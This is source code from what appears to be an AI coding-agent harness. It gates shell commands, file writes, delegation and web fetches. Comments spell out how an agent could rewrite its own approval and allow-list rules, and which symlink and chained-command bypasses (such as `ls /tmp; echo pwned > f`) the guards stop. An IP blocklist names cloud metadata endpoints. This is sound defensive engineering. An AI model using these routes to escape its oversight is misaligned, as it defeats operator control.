    // A permitted command that redirects is still a write.
    if (scan.redirection) {
      return refuse(
        "the command redirects output (>), which writes regardless of what it runs."
      );
    }

    // Every segment on its own merits. Testing the whole string let
    // `ls /tmp; echo pwned > f` through on the strength of its first two words.
    const matches = (segment: string) =>
      allowed.some((pattern) => {
        try {
          return new RegExp(pattern).test(segment);
        } catch {
          // A pattern that will not compile must not widen the allow-list.
          return false;
        }
      });

    const offending = scan.segments.find((seg) => !matches(seg));
    if (offending !== undefined || scan.segments.length === 0) {
      return refuse(
        `"${(offending ?? command).trim().slice(0, 80)}" is not on it.`
      );
    }
  }

  if (needsApproval("bash", ctx.gate)) {
    const ok = await ctx.approve({
      tool: "bash",
      summary: `bash: ${command}`,
      preview: command.split("\n").map((l) => `  $ ${l}`),
    });
    if (!ok) {
      return {
        code: TOOL_DENIED,
        content: "Refused: the user declined to run this command.",
        summary: `bash — denied`,
      };
    }
  }

  // A command that already timed out this turn will time out again, and the
  // second 120s buys exactly the information the first one did. Refuse it
  // instead, and say what would work -- a declared refusal, at no wall cost,
  // rather than a fourth identical stall.
  const commandKey = command.trim().replace(/\s+/g, " ");
  if (ctx.timedOutCommands?.has(commandKey)) {
    return {
      code: TOOL_FAILED,
      content:
        `Refused: this exact command already timed out after ${ctx.timeoutMs}ms in this turn, ` +
        `so running it unchanged will time out again and spend the same budget for the same result.\n\n` +
        `Do one of these instead:\n` +
        `  - start it in the background and poll the log:\n` +
        `      ${backgroundRecipe(command)}\n` +
        `    then read that log on a later step\n` +
        `  - narrow it so it finishes inside the limit (a single test, a smaller range)\n` +
        `  - or say plainly that this step cannot be completed within the tool timeout.`,
      summary: `bash — refused (already timed out this turn)`,
    };
  }

  // Pinned before the command runs so drift can be attributed to it. See
  // surfaceHashOf: bash is arbitrary shell, so the surface is detected moving
  // rather than prevented from moving.
  const surfaceBefore = surfaceHashOf(ctx);
  // Same reasoning one level out: whether the command changed the worktree is
  // observed, not guessed from its text. Feeds the nudge, not the verify gate.
  // Where this command will actually operate. A command that cd's elsewhere, or
  // installs into /usr/local, does work the ctx.root stamp cannot see.
  const shellCwd = ((): string | undefined => {
    const m = /(?:^|\s|&&|;)\s*cd\s+("[^"]+"|'[^']+'|[^\s;&|]+)/.exec(command);
    if (!m) return undefined;
    const raw = m[1].replace(/^["']|["']$/g, "");
    return raw.startsWith("/") ? raw : undefined;   // only absolute; relative stays inside root
  })();
  const worktreeBefore = worktreeStampOf(ctx, shellCwd);

  const startedAt = Date.now();
  return new Promise<ToolOutcome>((done) => {
    const proc = spawn(command, {
      shell: true,
      cwd: ctx.root,
      // stdin closed, stdout/stderr piped. An inherited stdin pipe that nobody
      // ever writes to makes any command that reads stdin block until the tool
      // timeout kills it -- `cat` with no argument, an npm prompt, a git
      // credential ask. Nothing here can answer them, so they get EOF instead.
      stdio: ["ignore", "pipe", "pipe"],
      // detached puts the command in its own process group. shell:true means
      // the direct child is `sh -c`, so signalling only that leaves the real
      // work orphaned and still running; the group is what must be killed.
      detached: true,
      // sandbox.network = false is declared in policy.toml but this build
      // cannot enforce it; the loop says so at startup rather than pretending.
    });
    let stdout = "";
    let stderr = "";
    let settled = false;

    const timer = setTimeout(() => {
      if (settled) return;
      settled = true;
      killTree(proc);
      // What the command printed before it was killed is evidence the harness
      // already holds: the failing test, the last line of a build, the prompt it
      // was blocked on. Discarding it left the model with nothing to act on but
      // the fact of the timeout, and the only move that leaves is to run the
      // same command again. Report the elapsed limit, then hand back both ends
      // of what was captured.
      const captured = [
        stdout ? `stdout:\n${stdout}` : "stdout: (empty)",
        stderr ? `stderr:\n${stderr}` : "",
      ]
        .filter(Boolean)
        .join("\n");
      releasePipes(proc);
      const drift = surfaceDrift(ctx, surfaceBefore);
      const movedTree = worktreeMoved(ctx, worktreeBefore, shellCwd);
      // So the next identical call is refused for free rather than stalling.
      ctx.timedOutCommands?.add(commandKey);
      done({
        code: TOOL_FAILED,
        worktree_changed: movedTree,
        content:
          `Command timed out after ${ctx.timeoutMs}ms and was killed. Output captured before the kill:\n` +
          clampEnds(captured, ctx.maxOutputBytes) +
          `\n\nIt did not finish, so this output is partial. Re-running it unchanged will time out again: ` +
          `narrow it, or start it in the background and poll:\n      ${backgroundRecipe(command)}\n` +
          `    then read ${JOB_LOG_DIR}/job.log on a later step.` +
          (drift ? `\n\n${drift.notice}` : ""),
        summary: `bash — timeout${drift ? " · surface changed" : ""}`,
        surface_drift: drift ?? undefined,
      });
    }, ctx.timeoutMs);

    // The operator pressing Esc must reach the process, not merely be noticed
    // once it has finished.
    const onAbort = () => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      killTree(proc);
      releasePipes(proc);
      done({
        code: TOOL_FAILED,
        content:
          `Cancelled by the operator after ${Date.now() - startedAt}ms. Output captured before the stop:\n` +
          clampEnds(
            [stdout ? `stdout:\n${stdout}` : "stdout: (empty)", stderr ? `stderr:\n${stderr}` : ""]
              .filter(Boolean)
              .join("\n"),
            ctx.maxOutputBytes
          ),
        summary: `bash — cancelled`,
      });
    };
    ctx.signal?.addEventListener("abort", onAbort, { once: true });

    proc.stdout?.on("data", (d: Buffer) => (stdout += d.toString()));
    proc.stderr?.on("data", (d: Buffer) => (stderr += d.toString()));
    proc.on("error", (err) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      done({
        code: TOOL_FAILED,
        content: `Could not run command: ${err.message}`,
        summary: `bash — failed to spawn`,
      });
    });
    // `exit`, NOT `close`.
    //
    // close waits for the child's stdio streams to close as well as the child
    // to end. A backgrounded job inherits sh's pipe write-ends, so the pipes
    // stay open for as long as the JOB runs, and close never fires though sh
    // exited in milliseconds. Measured: `sleep 30 & echo started` blocked the
    // full timeout and was then SIGKILLed by killTree, so the model was handed
    // proof the job had started AND a timeout, while the job itself was dead.
    // `sleep 30 >log 2>&1 &` returned in 2ms -- the difference was only whether
    // BOTH streams were redirected, which is not a distinction any model can be
    // expected to get right every time. It is also the harness's own advice for
    // long commands, so the recommended path was the broken one.
    //
    // A short drain after exit collects output still in flight; the process is
    // already gone, so this waits on bytes, not on the job.
    proc.on("exit", (exit, signal) => {
      if (settled) return;
      setTimeout(() => finish(exit, signal), 40);
    });
    const finish = (exit: number | null, signal?: NodeJS.Signals | null) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      // stderr BEFORE stdout when the command failed, and both ends kept.
      //
      // The old order put stderr last and clamped head-only, so a chatty build
      // that failed returned 32KB of "Compiling crate-1..3999" and dropped the
      // compiler error entirely -- the model was told the build failed and shown
      // nothing about why, with a footer advising it to "narrow it with grep",
      // which cannot be done for a build. Measured: 4000 progress lines plus one
      // E0308 on stderr came back with the error absent.
      //
      // The timeout path already reasons this way ("the reason it was still
      // running is usually the last thing it printed"); a non-zero exit deserves
      // the same treatment, and its diagnostics are the point of the call.
      const failed = exit !== 0;
      const body = failed
        ? [
            `exit: ${exit}`,
            stderr ? `stderr:\n${stderr}` : "stderr: (empty)",
            stdout ? `stdout:\n${stdout}` : "stdout: (empty)",
          ]
            .filter(Boolean)
            .join("\n")
        : [
            `exit: ${exit}`,
            stdout ? `stdout:\n${stdout}` : "stdout: (empty)",
            stderr ? `stderr:\n${stderr}` : "",
          ]
            .filter(Boolean)
            .join("\n");
      const drift = surfaceDrift(ctx, surfaceBefore);
      const movedTree = worktreeMoved(ctx, worktreeBefore, shellCwd);
      done({
        code: TOOL_OK,
        worktree_changed: movedTree,
        content:
          (failed ? clampEnds(body, ctx.maxOutputBytes) : clamp(body, ctx.maxOutputBytes)) +
          (drift ? `\n\n${drift.notice}` : ""),
        // `exit` is null when the child died on a signal, and "exit null" then
        // failed the verify gate's /exit (-?\d+)/ and fell through to its
        // `code === 0 ? 0 : 1` default -- reporting a segfaulted or OOM-killed
        // check as PASSED. Name the signal instead, so nothing can read it as a
        // clean zero.
        summary:
          (exit === null && signal
            ? `bash — killed by ${signal}`
            : `bash — exit ${exit}`) + (drift ? " · surface changed" : ""),
        surface_drift: drift ?? undefined,
      });
    };
  });
}

/**
 * Compile one glob to an anchored RegExp.
 *
 * Globs, not regexes, unlike bash_allow. A path pattern written as a regex is
 * over-permissive by default in a way that is easy to miss: `docs/` matches
 * `src/docs/anything`, because an unanchored regex matches a substring and `.`
 * is any character. A scope that silently permits more than it reads is worse
 * than no scope, so paths take the notation where the obvious spelling is also
 * the safe one.
 *
 * `*` stops at a separator, `**` crosses them, and `**` followed by a
 * separator also matches nothing at all — so `**\/*.md` covers both `NOTES.md`
 * and `docs/NOTES.md`.
 */
export function globToRegExp(glob: string): RegExp {
  let out = "";
  for (let i = 0; i < glob.length; i++) {
    const c = glob[i];
    if (c === "*") {
      if (glob[i + 1] === "*") {
        if (glob[i + 2] === "/") {
          out += "(?:.*/)?";
          i += 2;
        } else {
          out += ".*";
          i += 1;
        }
      } else {
        out += "[^/]*";
      }
    } else if (c === "?") {
      out += "[^/]";
    } else {
      out += c.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    }
  }
  return new RegExp(`^${out}$`);
}

/**
 * Is this role allowed to modify this path?
 *
 * Matches the path *after* resolution, relative to the root, so `docs/../src`
 * is judged as `src` rather than as something starting with `docs/`. Checking
 * the argument as written would make the scope bypassable by anyone who typed
 * two dots.
 */
/**
 * Whether `abs` lands inside the `.gnomon/` surface.
 *
 * The surface is the thing every behaviour is a function of: the tool list,
 * the approval gate, the per-role `bash_allow` and `write_allow`. An agent
 * that can write there can rewrite the rules it is being judged by — set
 * `approval = "never"`, widen `bash_allow`, hand itself the `edit` tool — and
 * the next turn runs under the surface it authored. It also silently moves
 * the surface hash, which is the one identifier a session is traced by.
 *
 * So `write` and `edit` stop at the boundary regardless of role. Changing the
 * surface stays a human act, done in an editor. The `skill` tool is the sole
 * sanctioned way in, and it does not come through here: it writes proposals
 * to `.gnomon/skills/proposed/`, which are inert until `gnomon skill accept`
 * moves them — deliberately changing the hash, with a person doing it.
 */
/**
 * The current surface hash, or null if it cannot be computed.
 *
 * `write` and `edit` stop at the `.gnomon/` boundary, but `bash` cannot be
 * held to that: the command is arbitrary shell, and an allow-list that tried
 * to spot every way a process can touch a file would be a guess dressed up as
 * a guarantee. So the surface is not *prevented* from moving under bash — it
 * is *detected*, by re-reading the hash on the far side of the command.
 *
 * Detection rather than prevention is the honest primitive here, and it is
 * the one the harness already relies on: the hash is what makes a session
 * reproducible, so a hash that moved mid-session is exactly the fact a reader
 * needs, whatever mechanism moved it.
 */
/** A surface hash that moved while a command ran. */
export interface SurfaceDrift {
  before: string;
  after: string;
  notice: string;
}

/**
 * Compare the surface hash against the one pinned before a command ran.
 *
 * Returns null when nothing moved, which is the overwhelmingly common case
 * and costs one walk of `.gnomon/`.
 */
export function surfaceDrift(
  ctx: ToolContext,
  before: string | null
): SurfaceDrift | null {
  if (!before) return null;
  const after = surfaceHashOf(ctx);
  if (!after || after === before) return null;
  return {
    before,
    after,
    notice:
      `[gnomon] WARNING: that command changed .gnomon/ — the surface hash ` +
      `moved from ${before.slice(0, 12)} to ${after.slice(0, 12)}. The rules ` +
      `this session is running under are no longer the ones it started with, ` +
      `and the earlier turns were recorded against a surface that no longer ` +
      `exists. Do not try to undo this — no git checkout, no revert of ` +
      `.gnomon/: bash is not gated on that path, so an attempt would ` +
      `discard whatever the operator has uncommitted there, and if changing ` +
      `.gnomon/ was the task it would revert the work itself. Carry on, and ` +
      `say in your final answer that the surface moved mid-session.`,
  };
}

export function surfaceHashOf(ctx: ToolContext): string | null {
  const dir = ctx.config?.gnomonDir ?? join(ctx.root, ".gnomon");
  try {
    return recomputeManifest(dir).surface_hash;
  } catch {
    return null;
  }
}

/**
 * A cheap, deterministic stamp of the worktree: which files exist, and their
 * size and mtime.
 *
 * Used only to answer "did this shell command change anything?" — the question
 * the anti-flailing nudge was getting wrong. In the 48-task benchmark arm, 49
 * of the 50 nudged trials had made no `write`/`edit` call at all, because the
 * model was editing through heredocs and `sed -i`; the counter saw an idle
 * agent and told a working one to stop.
 *
 * Observation, not inference: a pattern list over `sed|tee|make` would be a
 * behaviour-deciding rule living outside the content-hashed surface, and it
 * would be wrong on the first command it had not been taught. This reuses the
 * same walk `glob`/`grep` use, so it inherits their fixed ignore set and their
 * file cap, and it never reads file contents.
 *
 * Returns null when the tree cannot be stamped, which callers must read as
 * "unknown", never as "unchanged".
 *
 * Cost, measured: 1.4ms on this repo (273 walked files) and 79.6ms on a
 * synthetic tree at the WALK_MAX_FILES cap — so at most ~160ms per bash call,
 * against a measured model round-trip of 7.4s median. It stats, never reads.
 */
export function worktreeStampOf(ctx: ToolContext, alsoRoot?: string): string | null {
  try {
    const h = createHash("sha256");
    // A second root, when the shell is working somewhere else. This walked only
    // ctx.root, so a task whose work is an apt install, an /etc config or a
    // system service could never move the stamp — and the anti-flailing nudge
    // fired on an agent that was working correctly. One trial printed
    // "98 call(s) without changing a file" immediately after postconf -e,
    // service start and chown, with two of its tests already passing. The
    // nudge was not wrong to fire on its premise; the premise was false.
    const roots = alsoRoot && alsoRoot !== ctx.root ? [ctx.root, alsoRoot] : [ctx.root];
    for (const base of roots)
    for (const rel of walkFiles(base, base)) {
      // .gnomon/ has its own stamp (surfaceHashOf) and its own meaning; a
      // surface edit is drift, not progress.
      if (rel === ".gnomon" || rel.startsWith(".gnomon/")) continue;
      let st: Stats;
      try {
        st = statSync(join(base, rel));
      } catch {
        continue; // vanished mid-walk: the next stamp will differ anyway
      }
      h.update(`${base}/${rel}:${st.size}:${st.mtimeMs}\n`);
    }
    return h.digest("hex");
  } catch {
    return null;
  }
}

/**
 * Did the worktree move? Only a stamp taken on both sides can say so; an
 * unstampable tree is unknown, and unknown must not read as changed (that
 * would disarm the nudge) nor as unchanged in a way anyone relies on.
 */
export function worktreeMoved(ctx: ToolContext, before: string | null, alsoRoot?: string): boolean {
  if (before === null) return false;
  const after = worktreeStampOf(ctx, alsoRoot);
  return after !== null && after !== before;
}

export function inSurface(ctx: ToolContext, abs: string): boolean {
  // Realpath both sides. Comparing lexical paths let a symlink inside the repo
  // (`glink -> .gnomon`) read as an ordinary file, so `write glink/roles.toml`
  // skipped the strict/consent gate while the write still landed in .gnomon/.
  // resolveInRoot already realpaths for the sandbox check; this guard must
  // match it, or the surface pillar is bypassable by a single symlink.
  const surface = realpathOrSelf(
    ctx.config?.gnomonDir
      ? resolve(ctx.config.gnomonDir)
      : resolve(ctx.root, ".gnomon")
  );
  const rel = relative(surface, realpathOfNearest(abs));
  return rel === "" || (!rel.startsWith("..") && !isAbsolute(rel));
}

export function writeAllowed(
  ctx: ToolContext,
  abs: string
): { ok: true } | { ok: false; rel: string; listed: string } {
  const allowed = ctx.writeAllow?.filter((p) => p.trim().length > 0) ?? [];
  if (allowed.length === 0) return { ok: true };
  // Resolved, not lexical. resolveInRoot and inSurface both realpath here --
  // the first because "a symlink inside the repository pointing anywhere on the
  // filesystem passed this check untouched", the second because otherwise "the
  // surface pillar is bypassable by a single symlink". write_allow was the one
  // guard left out, so a symlink inside an allowed directory could point
  // anywhere and still count as allowed.
  const rel = relative(realpathOrSelf(resolve(ctx.root)), realpathOfNearest(abs))
    .split(sep)
    .join("/");
  const ok = allowed.some((pattern) => {
    try {
      return globToRegExp(pattern).test(rel);
    } catch {
      return false;
    }
  });
  return ok
    ? { ok: true }
    : { ok: false, rel, listed: allowed.map((p) => `"${p}"`).join(", ") };
}

/**
 * `todo` — the checklist a long run is steered by.
 *
 * A turn that spans thirty tool calls loses the shape of what it set out to
 * do. The model re-derives the plan from the transcript every few steps, which
 * costs tokens and drifts; and whoever is watching cannot tell how far through
 * it is. An explicit list fixes both, and it is the model's own list rather
 * than the harness's guess at one.
 *
 * The whole list is replaced on every call rather than patched item by item.
 * A patch protocol needs stable identifiers, and identifiers a model invents
 * are a source of silent mismatches — "update item 3" against a list it has
 * since reordered. Replacing is idempotent and has no such failure.
 *
 * It touches no file and reaches nothing outside the session, so it is not in
 * MUTATING and costs no approval under `on_write`.
 */
async function todoTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  if (!ctx.todos) {
    return {
      code: TOOL_FAILED,
      content: "The checklist is unavailable in this run.",
      summary: "todo — unavailable",
    };
  }

  const raw = args.todos;
  if (!Array.isArray(raw)) {
    return {
      code: TOOL_FAILED,
      content:
        "todo takes `todos`: the complete list, e.g. " +
        '[{"content":"read the config","status":"completed"}]. ' +
        "Send the whole list every time — it replaces the previous one.",
      summary: "todo — no list",
    };
  }
  if (raw.length > 100) {
    return {
      code: TOOL_FAILED,
      content: "A checklist of more than 100 items is a plan that needs splitting.",
      summary: "todo — too many items",
    };
  }

  const todos: Todo[] = [];
  for (const item of raw) {
    const o = (item ?? {}) as Record<string, unknown>;
    const content = String(o.content ?? "").trim();
    if (!content) {
      return {
        code: TOOL_FAILED,
        content: "Every checklist item needs a non-empty `content`.",
        summary: "todo — empty item",
      };
    }
    const status = String(o.status ?? "pending");
    if (status !== "pending" && status !== "in_progress" && status !== "completed") {
      return {
        code: TOOL_FAILED,
        content:
          `"${status}" is not a status. Use pending, in_progress or completed.`,
        summary: "todo — bad status",
      };
    }
    todos.push({ content: content.slice(0, 200), status });
  }

  // One thing at a time, enforced rather than suggested. A list with four
  // items in progress is a list nobody is steering by, and it is the shape a
  // model drifts into when nothing stops it.
  const running = todos.filter((t) => t.status === "in_progress");
  if (running.length > 1) {
    return {
      code: TOOL_FAILED,
      content:
        `${running.length} items are in_progress. Exactly one thing is worked ` +
        `on at a time — mark the others pending.`,
      summary: `todo — ${running.length} in progress`,
    };
  }

  const denied = await gateReadOnly("todo", `todo — ${todos.length} item(s)`, ctx);
  if (denied) return denied;

  ctx.todos.replace(todos);

  const done = todos.filter((t) => t.status === "completed").length;
  const mark = (t: Todo) =>
    t.status === "completed" ? "[x]" : t.status === "in_progress" ? "[>]" : "[ ]";
  const body = todos.map((t) => `${mark(t)} ${t.content}`).join("\n");
  const now = running[0]?.content;
  return {
    code: TOOL_OK,
    content:
      `Checklist (${done}/${todos.length} done):\n${body || "(empty)"}` +
      (now ? `\n\nWorking on: ${now}` : ""),
    summary: `todo — ${done}/${todos.length} done${now ? ` · ${now.slice(0, 40)}` : ""}`,
  };
}

/**
 * `compute` — arithmetic the model is not asked to do in its head.
 *
 * A language model asked for a number produces one whether or not it computed
 * it, and the wrong answer arrives with exactly the same confidence as the
 * right one. Giving it somewhere deterministic to send the question is worth
 * more than any instruction not to guess — so system.md points here, and this
 * evaluates the expression exactly rather than in floating point.
 *
 * Pure: no filesystem, no network, no state. That makes it read-only in the
 * sense the approval gate cares about, so it is not in MUTATING and never
 * interrupts anyone for sign-off.
 */
async function computeTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const expression = String(args.expression ?? "").trim();
  const denied = await gateReadOnly("compute", `compute ${expression}`, ctx);
  if (denied) return denied;

  try {
    const value = compute(expression);
    return {
      code: TOOL_OK,
      content: `${expression} = ${value}`,
      summary: `compute ${expression} = ${value}`,
    };
  } catch (err) {
    if (err instanceof ComputeError) {
      // 11, not a refusal. The published contract puts "ambiguous edit" here —
      // a tool that understood the request and could not carry it out — and an
      // expression that will not parse is the same shape. Refusal (2-4) is
      // reserved for something saying no: a declined approval, an allow-list,
      // a tool this role was not given. Keeping that line in one place is what
      // lets a reader treat the buckets as meaning anything.
      return {
        code: TOOL_FAILED,
        content: `Cannot evaluate "${expression}": ${err.message}`,
        summary: `compute — ${err.message}`,
      };
    }
    throw err;
  }
}

/**
 * `task` — run a sub-turn under another role, with its own context.
 *
 * The separation this makes possible is the one the harness is built around:
 * a critique that never saw the implementer's reasoning, a verifier that
 * cannot have edited what it judges. Until now that separation existed only
 * across turns a person drove by hand — you switched role and re-explained.
 * This lets one turn reach for it.
 *
 * Three things it deliberately does:
 *
 *   * The sub-turn gets the *target role's* tools, not the caller's. That is
 *     the whole point — delegating to `verifier` must not hand it `write`
 *     because the implementor had it. Capability comes from the surface.
 *   * It cannot nest. A sub-turn is offered no `task` tool, so a run cannot
 *     fan out into a tree nobody bounded. One level is enough for the
 *     separation and is a depth a reader can hold.
 *   * Only the answer comes back, not the transcript. Replaying a sub-turn's
 *     tool calls into the parent would defeat the isolation that made it worth
 *     running — and cost the context twice.
 *
 * Gated like a write. Its own tool calls are gated individually too, so the
 * extra prompt is not redundant: it is the moment capability changes hands,
 * and it names which role is about to get what.
 */
async function taskTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  if (!ctx.delegate) {
    return {
      code: TOOL_FAILED,
      content: "Sub-turns are unavailable in this run.",
      summary: "task — unavailable",
    };
  }
  if (ctx.delegate.depth > 0) {
    // Reached only if a surface offers `task` to a role a sub-turn runs as;
    // the sub-turn's tool list already withholds it.
    return {
      code: TOOL_DENIED,
      content:
        "Refused: a sub-turn cannot start another one. Do this work here, or " +
        "report back so the turn that called you can delegate again.",
      summary: "task — refused (already a sub-turn)",
    };
  }

  const role = String(args.role ?? "").trim();
  const instruction = String(args.instruction ?? "").trim();
  const known = ctx.delegate.roles();

  if (!role || !known.includes(role)) {
    return {
      code: TOOL_FAILED,
      content:
        `"${role || "(none)"}" is not a role in this repository. ` +
        `Available: ${known.join(", ")}.`,
      summary: `task — unknown role "${role}"`,
    };
  }
  if (!instruction) {
    return {
      code: TOOL_FAILED,
      content:
        "task needs an `instruction`. The sub-turn starts with no history, so " +
        "say everything it needs — it cannot see this conversation.",
      summary: "task — no instruction",
    };
  }

  const subTools = ctx.config ? buildToolSet(ctx.config, role) : null;
  const offers = subTools
    ? subTools.schemas.map((t) => t.function.name).filter((n) => n !== "task")
    : [];

  if (needsApproval("task", ctx.gate)) {
    const ok = await ctx.approve({
      tool: "task",
      summary: `delegate to "${role}"`,
      preview: [
        `  role:  ${role}`,
        `  tools: ${offers.join(", ") || "(none)"}`,
        ...instruction.split("\n").slice(0, 12).map((l) => `  │ ${l}`),
      ],
    });
    if (!ok) {
      return {
        code: TOOL_DENIED,
        content: `Refused: the user declined to delegate to "${role}".`,
        summary: `task ${role} — denied`,
      };
    }
  }

  const r = await ctx.delegate.run(role, instruction);
  return {
    // The sub-turn's worst outcome is this call's outcome: a delegated
    // refusal is a refusal, not a successful delegation of one.
    code: r.code,
    content:
      `Sub-turn as "${role}" (${r.model}, ${r.toolSteps} tool call(s)) reported:\n\n` +
      r.content,
    summary: `task ${role} — ${r.toolSteps} tool call(s)`,
  };
}

// ---------------------------------------------------------------------------
// Network
// ---------------------------------------------------------------------------

/**
 * Address ranges a fetched URL may never resolve to.
 *
 * A URL supplied by a model is attacker-influenced input in every deployment
 * where the model reads anything it did not write — a fetched page, a file, an
 * issue comment. Left unchecked, `webfetch` is a server-side request forgery
 * primitive pointed at whatever the machine can reach but the network cannot:
 * a metadata endpoint holding cloud credentials, an unauthenticated admin port
 * on localhost, a service on the LAN.
 *
 * The check is on the *resolved address*, not the hostname, because a name is
 * not a destination: `localtest.me` and any attacker-controlled domain can
 * publish an A record pointing at 127.0.0.1.
 */
function isBlockedAddress(ip: string): boolean {
  const v4 = ip.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/);
  if (v4) {
    const [a, b] = [Number(v4[1]), Number(v4[2])];
    if (a === 0) return true; // "this network"
    if (a === 10) return true; // private
    if (a === 127) return true; // loopback
    if (a === 169 && b === 254) return true; // link-local, incl. cloud metadata
    if (a === 172 && b >= 16 && b <= 31) return true; // private
    if (a === 192 && b === 168) return true; // private
    if (a === 100 && b >= 64 && b <= 127) return true; // carrier-grade NAT
    if (a >= 224) return true; // multicast and reserved
    return false;
  }
  const v6 = ip.toLowerCase().replace(/^\[|\]$/g, "");
  if (v6 === "::1" || v6 === "::") return true; // loopback, unspecified
  if (/^fe[89ab]/.test(v6)) return true; // link-local: fe80::/10 spans fe80–febf
  if (/^f[cd]/.test(v6)) return true; // unique local
  // NAT64 well-known prefix (64:ff9b::/96) embeds an IPv4 in the low 32 bits;
  // decode it so a NAT64 spelling of a blocked address is blocked too.
  const nat64 = v6.match(/^64:ff9b::(?:0:)?(.+)$/);
  if (nat64) {
    const tail = nat64[1];
    const dotted = tail.match(/^\d+\.\d+\.\d+\.\d+$/);
    if (dotted) return isBlockedAddress(tail);
    const hex = tail.match(/^([0-9a-f]{1,4}):([0-9a-f]{1,4})$/);
    if (hex) {
      const hi = parseInt(hex[1], 16), lo = parseInt(hex[2], 16);
      return isBlockedAddress(`${(hi >> 8) & 0xff}.${hi & 0xff}.${(lo >> 8) & 0xff}.${lo & 0xff}`);
    }
  }
  // IPv4-mapped and IPv4-compatible addresses are the same destination by
  // another spelling, and both the dotted tail (::ffff:127.0.0.1) and the hex
  // tail have to be decoded — `::ffff:7f00:1` is 127.0.0.1 and
  // `::ffff:a9fe:a9fe` is 169.254.169.254 (the metadata endpoint). Checking
  // only the dotted form blocked one spelling and waved the other through.
  const mappedDotted = v6.match(/^::(?:ffff:)?(\d+\.\d+\.\d+\.\d+)$/);
  if (mappedDotted) return isBlockedAddress(mappedDotted[1]);
  const mappedHex = v6.match(/^::(?:ffff:)?([0-9a-f]{1,4}):([0-9a-f]{1,4})$/);
  if (mappedHex) {
    const hi = parseInt(mappedHex[1], 16);
    const lo = parseInt(mappedHex[2], 16);
    const v4 = `${(hi >> 8) & 0xff}.${hi & 0xff}.${(lo >> 8) & 0xff}.${lo & 0xff}`;
    return isBlockedAddress(v4);
  }
  return false;
}

/** Every address a host resolves to must be allowed, not merely the first. */
async function resolvesToBlocked(hostname: string): Promise<string | null> {
  const bare = hostname.replace(/^\[|\]$/g, "");
  if (isBlockedAddress(bare)) return bare; // a literal IP needs no lookup
  let addrs: { address: string }[];
  try {
    addrs = await dnsLookup(bare, { all: true, verbatim: true });
  } catch {
    return null; // a name that will not resolve fails at fetch, with its own error
  }
  // Any address being blocked blocks the fetch: a host that answers with one
  // public and one loopback address is the classic rebinding shape.
  for (const a of addrs) {
    if (isBlockedAddress(a.address)) return a.address;
  }
  // Residual, documented rather than pretended away: this resolves the name and
  // then fetch() resolves it again independently, so a name with a TTL-0 record
  // that alternates public/loopback answers (DNS rebinding) can pass here and
  // connect to a blocked address. Fully closing it needs pinning the vetted IP
  // through a custom dispatcher, which this zero-dependency build cannot import
  // without breaking HTTPS certificate validation. webfetch is opt-in per role
  // and gated behind [sandbox] network, which bounds the exposure.
  return null;
}

/** Strip tags and collapse whitespace — the text, not the markup. */
function htmlToText(html: string): string {
  return html
    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, " ")
    .replace(/<style\b[^>]*>[\s\S]*?<\/style>/gi, " ")
    .replace(/<!--[\s\S]*?-->/g, " ")
    .replace(/<[^>]+>/g, " ")
    .replace(/&nbsp;/g, " ")
    .replace(/&amp;/g, "&")
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/[ \t]+/g, " ")
    .replace(/\n\s*\n\s*\n+/g, "\n\n")
    .trim();
}

/**
 * `webfetch` — retrieve a URL as text.
 *
 * Outward-facing, so it is gated like a write: the request leaves the machine,
 * and what leaves it is a URL a model chose. It is also the one tool that
 * makes `[sandbox] network` real. That key was declared and unenforced — the
 * startup banner said so — which is the same shape as `approval = "always"`
 * being a dial that turned nothing. `network = false` now refuses the fetch
 * and names the file, so the default surface has no network reach and gaining
 * it is a visible edit that moves the surface hash.
 */
async function webfetchTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const raw = String(args.url ?? "").trim();
  if (!raw) {
    return {
      code: TOOL_FAILED,
      content: "webfetch needs a `url`.",
      summary: "webfetch — no url",
    };
  }

  if (ctx.network === false) {
    return {
      code: TOOL_DENIED,
      content:
        `Refused: .gnomon/policy.toml sets [sandbox] network = false, so tools ` +
        `may not reach the network. Set it to true to allow webfetch — that is ` +
        `an edit to the surface, and it changes the surface hash.`,
      summary: `webfetch ${raw} — refused (network disabled)`,
    };
  }

  let url: URL;
  try {
    url = new URL(raw);
  } catch {
    return {
      code: TOOL_FAILED,
      content: `"${raw}" is not a valid URL.`,
      summary: "webfetch — bad url",
    };
  }
  if (url.protocol !== "http:" && url.protocol !== "https:") {
    // file: would read the filesystem with none of the sandbox checks that
    // `read` applies; the rest are not fetchable in any useful sense.
    return {
      code: TOOL_DENIED,
      content: `Refused: only http and https are fetchable, not "${url.protocol}".`,
      summary: `webfetch — ${url.protocol} refused`,
    };
  }

  const blocked = await resolvesToBlocked(url.hostname);
  if (blocked) {
    return {
      code: TOOL_DENIED,
      content:
        `Refused: ${url.hostname} resolves to ${blocked}, a private, loopback ` +
        `or link-local address. Fetching those would let a URL reach services ` +
        `this machine can see and the network cannot — including cloud ` +
        `metadata endpoints.`,
      summary: `webfetch ${url.hostname} — refused (private address)`,
    };
  }

  const denied = await gateReadOnly("webfetch", `webfetch ${url.href}`, ctx, [
    `  GET ${url.href}`,
  ]);
  if (denied) return denied;

  let res: Response;
  try {
    res = await fetch(url, {
      // Redirects are followed by hand so each hop is re-checked; `follow`
      // would let a public URL bounce to 169.254.169.254 unexamined.
      redirect: "manual",
      headers: { "User-Agent": "gnomon", Accept: "text/*, application/json;q=0.9, */*;q=0.1" },
      signal: AbortSignal.timeout(ctx.timeoutMs),
    });
  } catch (err) {
    return {
      code: TOOL_FAILED,
      content: `Could not fetch ${url.href}: ${err instanceof Error ? err.message : String(err)}`,
      summary: `webfetch ${url.hostname} — failed`,
    };
  }

  if (res.status >= 300 && res.status < 400) {
    const to = res.headers.get("location");
    return {
      code: TOOL_OK_EMPTY,
      content:
        `${url.href} redirects (${res.status}) to ${to ?? "an unnamed location"}. ` +
        `Redirects are not followed automatically — call webfetch again with ` +
